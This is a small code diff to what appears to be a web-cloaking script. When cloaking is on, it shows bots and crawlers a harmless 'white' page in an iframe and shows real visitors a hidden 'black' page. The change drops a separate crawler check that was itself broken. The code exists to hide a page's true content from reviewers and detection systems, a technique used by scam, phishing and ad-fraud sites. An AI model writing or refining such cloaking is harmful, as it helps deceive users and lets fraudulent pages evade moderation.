@@ -26,10 +26,6 @@ const isBot = () => {
 }
 const iframe = document.getElementById('tree');
 
-const isCrawler = () => {
-  return event.isTrusted;
-}
-
 // 
 var redirectUrl = 'REDIRECT_URL';
 var crawlerUserAgentPattern = 'BLOCKED_USER_AGENTS';
@@ -80,9 +76,8 @@ const handleFeatures = () => {
 
 const handleBotCrawling = () => {
   const bot = isBot();
-  const isCrawler = isCrawler();
   if (cloaking_on) {
-    if (bot || isCrawler) iframe.src = white_page;
+    if (bot) iframe.src = white_page;
     else iframe.src = black_page;
   } else {
     iframe.src = white_page;
